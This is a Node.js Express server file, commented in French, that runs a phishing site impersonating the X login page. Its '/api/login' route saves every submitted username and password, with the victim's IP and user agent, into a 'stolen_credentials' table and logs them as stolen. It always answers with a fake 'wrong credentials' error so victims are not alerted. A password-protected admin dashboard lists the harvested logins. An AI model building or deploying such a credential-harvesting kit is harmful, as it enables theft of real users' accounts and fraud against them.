const express = require('express');
const session = require('express-session');
const path = require('path');
const { createClient } = require('@libsql/client');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION BDD ---
const db = createClient({
    url: process.env.TURSO_DATABASE_URL || 'file:local.db',
    authToken: process.env.TURSO_AUTH_TOKEN || undefined
});

// --- INITIALISATION DE LA BDD ---
async function initDb() {
    await db.execute(`
        CREATE TABLE IF NOT EXISTS stolen_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    console.log('✅ Base de données initialisée');
}
initDb().catch(console.error);

// --- MIDDLEWARE ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Sessions pour l'admin
app.use(session({
    secret: 'x-honeypot-secret-key-change-me',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 24h
    }
}));

// --- ROUTES PUBLIQUES ---

// 1. Page d'accueil (fausse page X)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 2. Page admin (connexion)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'private', 'admin.html'));
});

// 3. Dashboard admin (protégé)
app.get('/admin/dashboard', (req, res) => {
    if (!req.session.user) {
        return res.redirect('/admin');
    }
    res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
});

// --- API ROUTES ---

// 4. Enregistrer les identifiants volés (route publique)
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ error: 'Champs requis' });
    }

    try {
        // Enregistrer dans la BDD
        await db.execute({
            sql: 'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
            args: [
                username, 
                password, 
                req.ip || req.headers['x-forwarded-for'] || 'unknown',
                req.headers['user-agent'] || 'unknown'
            ]
        });

        console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);

        // Toujours répondre "échec" pour faire croire que c'est une vraie page X
        res.status(401).json({ 
            error: 'Identifiants incorrects. Veuillez réessayer.' 
        });

    } catch (error) {
        console.error('Erreur BDD:', error);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 5. Récupérer les identifiants volés (route protégée)
app.get('/api/credentials', async (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Non autorisé' });
    }

    try {
        const result = await db.execute('SELECT * FROM stolen_credentials ORDER BY created_at DESC');
        res.json(result.rows);
    } catch (error) {
        console.error('Erreur BDD:', error);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 6. Supprimer un identifiant (route protégée)
app.delete('/api/credentials/:id', async (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Non autorisé' });
    }

    const id = req.params.id;
    try {
        await db.execute({
            sql: 'DELETE FROM stolen_credentials WHERE id = ?',
            args: [id]
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Erreur BDD:', error);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 7. Connexion admin (vérifie les identifiants)
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    const adminUser = process.env.ADMIN_USER || 'admin';
    const adminPass = process.env.ADMIN_PASSWORD || 'changeme';

    if (username === adminUser && password === adminPass) {
        req.session.user = { username };
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Identifiants incorrects' });
    }
});

// 8. Déconnexion admin
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// --- DÉMARRAGE ---
app.listen(PORT, () => {
    console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
    console.log(`📡 Fausse page X : http://localhost:${PORT}/`);
    console.log(`🔐 Panel admin : http://localhost:${PORT}/admin`);
    console.log(`👤 Identifiants admin par défaut : admin / changeme`);
});